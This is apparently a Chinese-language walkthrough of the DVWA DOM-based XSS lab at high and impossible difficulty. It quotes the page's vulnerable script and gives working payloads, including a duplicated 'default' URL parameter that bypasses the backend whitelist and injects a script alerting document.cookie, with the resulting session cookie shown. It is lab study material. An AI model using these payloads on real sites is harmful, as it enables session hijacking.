# DOM Based Cross Site Scripting (XSS)

> The developer is now white listing only the allowed languages, you must find a way to run your code without it going to the server.


使用之前在中等難度的解法也 ok

```
default=English&<script>alert(document.cookie)</script>
```

### 觀察

不過這次也有找到新的方式執行 javascript

先來看一下處理選單的 javascript

```bash
<form name="XSS" method="GET">
  <select name="default">
    <script>
      if (document.location.href.indexOf("default=") >= 0) {
        var lang = document.location.href.substring(
          document.location.href.indexOf("default=") + 8
        ); // English
        document.write(
          "<option value='" + lang + "'>" + decodeURI(lang) + "</option>"
        );
        document.write("<option value='' disabled='disabled'>----</option>");
      }

      document.write("<option value='English'>English</option>");
      document.write("<option value='French'>French</option>");
      document.write("<option value='Spanish'>Spanish</option>");
      document.write("<option value='German'>German</option>");
    </script>
  </select>
  <input type="submit" value="Select" />
</form>

```
可以發現它先透過 `indexOf` 來擷取 URL 上字串 `default=` 的字串開頭位置 (45)

將它 +8 個字元的長度 (就是 ‘default=’ 的長度 ) 後傳給 location.href.substring 就可以切除字串取想要的部分，也就是指定語言的部分

![](https://s3.us-west-2.amazonaws.com/secure.notion-static.com/68aec075-de28-4bd1-8c0b-6f1cf09e5234/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45EIPT3X45%2F20220218%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20220218T051803Z&X-Amz-Expires=86400&X-Amz-Signature=61e8f23b61705cb0cda96927ccd37ace93fcf4c8ecf999d3b921d3ca981f949d&X-Amz-SignedHeaders=host&response-content-disposition=filename%20%3D%22Untitled.png%22&x-id=GetObject)

那我們也許可以試著新增一個同樣的參數來捏照合法參數 🤔

這樣一來後端可能就會只檢查其中一個參數

在原本的 `?default=English` 之前再塞入一個 `?default=English2`

```bash
?default=English2&default=English
```

```bash
http://dvwa.localtest/vulnerabilities/xss_d/?default=English2&default=English
```

![](https://s3.us-west-2.amazonaws.com/secure.notion-static.com/44d2d4d6-1c24-4671-b6f4-daad8bd605ab/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45EIPT3X45%2F20220218%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20220218T051829Z&X-Amz-Expires=86400&X-Amz-Signature=db6440f5782ac8c6df2533a5dbaabc5b0c24886d4646c61f1247ffad4cc15a27&X-Amz-SignedHeaders=host&response-content-disposition=filename%20%3D%22Untitled.png%22&x-id=GetObject)

👉 成功，代表後端會檢查最後一個參數，而前端的 indexOf 則是指擷取碰到的第一個參數

```
?default=English<script>alert(document.cookie)</script>&default=English
```

```
http://dvwa.localtest/vulnerabilities/xss_d/?default=English%3Cscript%3Ealert(document.cookie)%3C/script%3E&default=English
```
![](https://s3.us-west-2.amazonaws.com/secure.notion-static.com/3f6aa90d-f14c-4fac-9633-ce91e7b9d649/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45EIPT3X45%2F20220218%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20220218T051859Z&X-Amz-Expires=86400&X-Amz-Signature=2841d536a7e25c38ac15613e70b4bda0831c2fffcfe7b98cd832e5e021b58302&X-Amz-SignedHeaders=host&response-content-disposition=filename%20%3D%22Untitled.png%22&x-id=GetObject)

```
PHPSESSID=ov64qqshkod7693old2kdk59e3; security=high
```

### impossible

在 impossible 難度下測試無效 😮‍💨

```jsx
http://dvwa.localtest/vulnerabilities/xss_d/?default=English%3Cscript%3Ealert(document.cookie)%3C/script%3E&default=English
```
